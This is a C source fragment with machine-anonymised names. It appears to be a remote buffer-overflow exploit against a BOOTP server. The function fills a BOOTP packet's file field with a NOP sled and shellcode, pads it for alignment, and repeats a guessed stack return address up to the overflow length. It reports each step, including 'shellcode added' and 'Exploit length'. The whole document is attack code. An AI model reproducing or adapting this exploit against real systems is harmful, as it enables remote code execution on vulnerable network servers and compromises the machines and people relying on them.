
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct bootp {int bp_xid; int bp_hlen; char* bp_file; TYPE_1__ bp_ciaddr; int bp_htype; int bp_op; } ;


 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,...) ;
 int VAR_5 ;
 char* VAR_6 ;
 int FUNC_2 (char*) ;

void FUNC_3(struct bootp *VAR_7, int VAR_8, char *VAR_9[])
{
    unsigned long VAR_10 = 0xbffff684 + VAR_5;
    unsigned long VAR_11 = VAR_10 + 8 + 0x488;
    unsigned long VAR_12, VAR_13 = 0;
    int VAR_14 = 1;
    int VAR_15 = 600;
    char *VAR_16;
    unsigned long *VAR_17;
    int VAR_18;

    VAR_7->bp_op = VAR_0;
    VAR_7->bp_xid = 58524;
    VAR_7->bp_htype = VAR_1;
    VAR_7->bp_hlen = 6;
    VAR_7->bp_ciaddr.s_addr = FUNC_0(VAR_2);

    FUNC_1("Using: client: %s\n", VAR_2);
    FUNC_1("Using: server: %s\n", VAR_4);
    FUNC_1("Addr of realpath: %x\n", VAR_10);
    VAR_16 = VAR_7->bp_file;

    for (VAR_18 = 0; VAR_18 < VAR_15; VAR_18++)
        *VAR_16++ = 0x90;
    FUNC_1("Added: %d nops\n", VAR_15);


    for(VAR_18 = 0; VAR_18 < FUNC_2(VAR_6); VAR_18++)
        *VAR_16++ = VAR_6[VAR_18];
    FUNC_1("%d bytes of shellcode added.\n", FUNC_2(VAR_6));


    VAR_12 = VAR_16 - VAR_7->bp_file + VAR_14 + VAR_10;
    for(VAR_18 = 0; VAR_18 < (VAR_11 - VAR_12) % 4; VAR_18++)
        *VAR_16++ = 'a';
    FUNC_1("%d bytes of alignment added.\n", (VAR_11 - VAR_12) %4);


    VAR_13 = VAR_10 + VAR_14 + (VAR_15 / 2);
    if (!(VAR_13 & 0xff)) VAR_13++;
    FUNC_1("Setting return addr to: %x \n", VAR_13);
    VAR_17 = (unsigned long *) VAR_16;
    do {
        *VAR_17++ = VAR_13;
        VAR_16 = (char *) VAR_17;
    } while ((VAR_16 - VAR_7->bp_file) < VAR_3);
    *VAR_16++ = '\0';
   FUNC_1("Exploit length: %d", FUNC_2(VAR_7->bp_file));
}
